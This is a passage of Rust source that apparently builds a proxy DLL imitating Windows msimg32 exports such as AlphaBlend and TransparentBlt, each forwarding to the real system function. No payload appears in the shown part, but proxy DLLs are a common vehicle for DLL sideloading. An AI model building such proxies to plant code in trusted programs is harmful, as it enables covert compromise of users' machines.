            let f: extern "system" fn() = std::mem::transmute(func);
            f();
        }
    }
}

#[no_mangle]
pub extern "system" fn vSetSpriteDDraw16() {
    unsafe {
        let func = get_system_func("vSetSpriteDDraw16");
        if !func.is_null() {
            let f: extern "system" fn() = std::mem::transmute(func);
            f();
        }
    }
}

#[no_mangle]
pub extern "system" fn vSetSpriteDDraw24() {
    unsafe {
        let func = get_system_func("vSetSpriteDDraw24");
        if !func.is_null() {
            let f: extern "system" fn() = std::mem::transmute(func);
            f();
        }
    }
}

#[no_mangle]
pub extern "system" fn vSetSpriteDDraw32() {
    unsafe {
        let func = get_system_func("vSetSpriteDDraw32");
        if !func.is_null() {
            let f: extern "system" fn() = std::mem::transmute(func);
            f();
        }
    }
}

#[no_mangle]
pub extern "system" fn AlphaBlend() {
    unsafe {
        let func = get_system_func("AlphaBlend");
        if !func.is_null() {
            let f: extern "system" fn() = std::mem::transmute(func);
            f();
        }
    }
}

#[no_mangle]
pub extern "system" fn TransparentBlt() {
    unsafe {
        let func = get_system_func("TransparentBlt");
        if !func.is_null() {
            let f: extern "system" fn() = std::mem::transmute(func);
            f();
        }
    }
}

#[no_mangle]
pub extern "system" fn DllInitialize() {
    unsafe {
        let func = get_system_func("DllInitialize");
        if !func.is_null() {
            let f: extern "system" fn() = std::mem::transmute(func);
            f();
        }
    }
}

#[no_mangle]
pub extern "system" fn DllUnload() {
    unsafe {
        let func = get_system_func("DllUnload");
        if !func.is_null() {
            let f: extern "system" fn() = std::mem::transmute(func);
            f();
        }
    }
}